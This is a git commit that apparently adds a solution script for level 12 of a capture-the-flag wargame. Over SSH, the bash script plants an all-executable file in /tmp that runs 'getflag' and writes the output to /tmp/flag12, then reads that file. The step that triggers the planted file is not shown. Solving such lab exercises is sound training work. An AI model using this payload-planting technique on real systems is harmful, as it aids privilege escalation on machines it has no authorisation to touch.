158df0cafd5c3c42a9c742c88da11bc83ac7f4b5
Clément Hamada <clementhamada@protonmail.com>
2021-10-26 23:35:58 +0200

    Add level12

---
+++ level12/solve.sh
@@ -0,0 +1,14 @@
+#!/usr/bin/env bash
+
+set -euo pipefail
+
+PARENT_DIR="$(dirname "$0")"
+UTILS_DIR="$PARENT_DIR/../utils"
+
+PATH="$UTILS_DIR:$PATH"
+
+host="$1"
+port="$2"
+pass="$3"
+
+sshexec.sh "$host" "$port" level12 "$pass" 'set -e; echo "getflag > /tmp/flag12" > /tmp/level12; chmod a+rx /tmp/level12; cat /tmp/flag12'
